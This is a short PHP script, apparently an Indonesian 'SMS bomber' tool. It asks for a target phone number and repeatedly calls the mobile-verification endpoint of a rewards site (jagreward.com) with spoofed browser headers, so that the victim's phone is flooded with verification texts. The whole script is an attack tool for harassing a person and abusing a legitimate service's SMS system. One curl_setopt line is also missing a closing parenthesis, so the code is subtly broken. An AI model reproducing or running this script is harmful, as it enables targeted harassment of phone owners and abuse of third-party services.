<?php
function kirim_sms($i, $no_hp)
{
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, "https://id.jagreward.com:443/member/verify-mobile/".$no_hp."/";
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 1);

    $headers   = array();
    $headers[] = "Host: id.jagreward.com";
    $headers[] = "Connection: keep-alive";
    $headers[] = "Accept: */*";
    $headers[] = "X-Requested-With: XMLHttpRequest";
    $headers[] = "Save-Data: on";
    $headers[] = "User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36";

    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $result = curl_exec($ch);
    return $result;
}

print "Bom SMS - JAG\n\n";
print "Thanks To : Muhammad Ikhsan Aprilyadi\n\n";

echo "Nomor Target : ";
$no_hp = trim(fgets(STDIN));

for($i = 2; $i < 26; $i++) {
    $js_result = json_decode(kirim_sms($i, $no_hp));
    $wtf = $js_result->wtf->result;
    echo "Cek SMS $wtf\n";
}
?>
